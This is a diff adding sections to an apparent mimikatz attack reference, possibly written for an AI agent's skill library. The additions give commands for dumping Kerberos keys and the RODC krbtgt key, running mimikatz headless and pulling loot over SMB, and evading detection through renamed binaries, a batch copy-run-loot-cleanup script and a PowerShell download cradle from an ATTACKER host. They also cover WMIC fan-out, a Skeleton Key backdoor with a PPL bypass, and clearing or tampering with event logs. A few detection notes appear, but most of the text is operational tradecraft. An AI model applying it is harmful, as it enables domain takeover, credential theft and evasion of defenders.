@@ -83,6 +83,14 @@ Dump Kerberos provider (AES keys, cached passwords).
 sekurlsa::kerberos
 ```
 
+### sekurlsa::ekeys
+
+Dump Kerberos encryption keys only (AES128 / AES256 / DES / RC4) — tighter output than `logonpasswords` when you just need keys for `kerberos::golden /aes256:` or offline cracking.
+
+```
+sekurlsa::ekeys
+```
+
 ---
 
 ## 2. SAM / LSA / NTDS
@@ -146,7 +154,26 @@ Dump LSA online (patch LSA in memory).
 ```
 lsadump::lsa /patch
 lsadump::lsa /inject
+lsadump::lsa /inject /name:krbtgt_8245   # RODC krbtgt — extracts AES256 key needed for RODC golden ticket
 ```
+
+**RODC krbtgt extraction**: `lsadump::lsa /inject /name:krbtgt_XXXXX` as SYSTEM on the RODC is the **only reliable method** to get the AES256 key — it never appears in an offline `ntds.dit` dump. Output contains `aes256_hmac (4096) : <hex>` under `Kerberos-Newer-Keys`, the key needed for `Rubeus.exe golden /rodcNumber:XXXXX /aes256:<key>` or `ticketer.py -aesKey <key>`. Full RODC workflow (kvno encoding, PRP, forge/reveal commands): `active-directory-technique/references/rodc-attacks.md`.
+
+### Headless execution (no console)
+
+When running mimikatz via SCM-based remote execution (smbexec, service creation, scheduled tasks), there is no console attached and stdout/stderr are not captured by the calling tool.
+
+**Solution**: use mimikatz's built-in `log` command to write output to a file on the target, then retrieve the file via SMB.
+
+```
+# Run via service/smbexec — output to file
+mimikatz.exe "privilege::debug" "log C:\Windows\Temp\mk.txt" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
+
+# Then retrieve via SMB
+smbclient.py -k -no-pass //TARGET/ADMIN$ -c "get Temp\mk.txt"
+```
+
+Do NOT use shell redirect (`> file.txt 2>&1`) for mimikatz via SCM — it produces empty files because the service process has no console handles.
 
 ---
 
@@ -409,6 +436,101 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
 
+### CLI / IOA evasion patterns (observed in the wild)
+
+Signature detections that key on the `mimikatz.exe` filename or the literal `sekurlsa::logonpasswords` string are trivially bypassed. Patterns seen by CrowdStrike OverWatch:
+
+**1. Rename the binary + stage under trusted path**
+```cmd
+copy mimikatz.exe C:\ProgramData\p.exe
+C:\ProgramData\p.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+Staging paths seen in the wild: `C:\ProgramData\p.exe`, `C:\Windows\Security\mnl.exe`. Combine with `log outfile.txt` when running via SCM/WMI (no console attached).
+
+**2. Batch-file lifecycle (copy → run → collect → cleanup)**
+```cmd
+@echo off
+copy \\SHARE\p.exe C:\Windows\Temp\p.exe >nul
+C:\Windows\Temp\p.exe "log C:\Windows\Temp\o.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit" >nul
+copy C:\Windows\Temp\o.txt \\SHARE\loot\%COMPUTERNAME%.txt >nul
+del /f C:\Windows\Temp\p.exe C:\Windows\Temp\o.txt
+```
+
+**3. PowerShell backtick obfuscation (defeats naive cmdline regex)**
+```powershell
+powershell -ep Bypass -NoP -NonI -NoLogo -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug` sekurlsa`::`logonpasswords `exit'"
+```
+Backticks split `sekurlsa::logonpasswords` at the string-scan layer; PowerShell reassembles it before execution. Same works with `'s'+'ekurlsa'` concatenation.
+
+**4. WMIC remote push (fan out to many hosts)**
+```cmd
+wmic /NODE:"TARGET" /USER:"DOMAIN\admin" /PASSWORD:"pw" process call create ^
+  "cmd.exe /c (C:\Windows\Security\mnl.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > C:\Windows\Security\out.txt) >> C:\Windows\Temp\t.txt"
+
+# Fan-out from a list
+for /F %h in (hosts.txt) do wmic /NODE:%h /USER:... process call create "cmd.exe /c ..."
+```
+`wmic` is deprecated on Win11 24H2+ — use `Invoke-CimMethod -ClassName Win32_Process -MethodName Create` on modern targets.
+
+**5. Custom forks with renamed modules/commands**
+Attacker-modified builds have been observed replacing the command table so calls look like `mnl.exe pr::dg sl::lp et` instead of `mimikatz.exe privilege::debug sekurlsa::logonpasswords exit`. Stock mimikatz does **not** accept these abbreviations — only recompiled forks. String-based cmdline detections fail; pivot detection to LSASS handle-access IOAs.
+
+**Detection-flip takeaway**: chain multiple weak signals (LSASS handle access + unusual parent process + `.kirbi`/`log` artifact + short-lived child of `wmiprvse.exe`/`services.exe`) rather than any single filename or cmdline substring.
+
+### Beacon / BOF command prefixes
+
+When invoked via Cobalt Strike Beacon's `mimikatz` command (or compatible BOF loaders), two prefixes change execution context:
+
+- `!command` — elevate to SYSTEM before running (equivalent to `token::elevate` + command). Example: `mimikatz !sekurlsa::logonpasswords`.
+- `@command` — keep Beacon's current access token (do NOT drop back to Beacon's process token). Useful with `make_token`/`steal_token`. Example: `mimikatz @lsadump::dcsync /user:krbtgt`.
+- Chain multiple commands with `;` (max 511 chars): `mimikatz crypto::capi ; crypto::certificates /systemstore:local_machine /store:my /export`.
+
+---
+
+## Skeleton Key — Domain Persistence
+
+`misc::skeleton` patches LSASS on a Domain Controller so a single master password (default: `mimikatz`) authenticates **any** domain account, while real passwords keep working. Memory-only — gone on DC reboot.
+
+**Requirements**: DA (or equivalent local admin on the DC), SeDebugPrivilege, code execution on the DC itself.
+
+```
+# On the DC, as SYSTEM/DA
+privilege::debug
+misc::skeleton
+# Output: [KDC] data
+#         [KDC] struct
+#         [KDC] keys patch OK
+#         [RC4] functions
+#         [RC4] init patch OK
+#         [RC4] decrypt patch OK
+
+# Authenticate as ANY domain user with password 'mimikatz'
+dir \\dc.corp.local\c$ /user:corp.local\administrator   # prompt → mimikatz
+```
+
+**Operational notes**:
+- **Push to every DC in the site.** Skeleton key does not replicate; users hitting an unpatched DC authenticate normally and the backdoor won't trigger.
+- **Server 2019 confirmed working. Server 2022 and later may fail** if AES-only Kerberos is enforced (skeleton downgrades to RC4).
+- **PPL bypass first** if LSASS runs as PPL (Win10/Server 2016+ with `RunAsPPL=1`):
+  ```
+  privilege::debug
+  !+                                        # load mimidrv.sys
+  !processprotect /process:lsass.exe /remove
+  misc::skeleton
+  !-                                        # unload driver
+  ```
+- **Custom master password** is not supported by stock `misc::skeleton` — the default `mimikatz` string is hardcoded. Forks exist that change it.
+
+**Detection vectors**:
+- Kerberos Event 4769 with RC4 encryption for accounts normally using AES.
+- Kernel driver install (`mimidrv.sys`) — Event 7045 with service name matching `mimidrv`:
+  ```powershell
+  Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.Message -like '*mimidrv*'}
+  ```
+- LSASS memory tampering signatures (EDR-specific).
+
+**Cleanup**: reboot the DC. There is no in-mimikatz "unpatch" command; the patch is memory-only.
+
 ---
 
 ## Common Attack Chains
@@ -463,6 +585,7 @@ exit
 - AES256 keys for Golden/Silver Tickets avoid RC4 downgrade alert (Event 4769 with RC4 flag)
 - Token elevation (`token::elevate`) is needed before `lsadump::sam/secrets` — do it before
 - Log `exit` at end to capture mimikatz output when redirecting stdout
+- `event::clear` wipes Security/System/Application evtx from inside mimikatz (needs SYSTEM). Loud on its own — generates Event 1102 (audit log cleared) which most SOCs alert on. Prefer `wevtutil cl` on specific logs, or selective log-record tampering, over `event::clear`.
 
 ## Resources
 
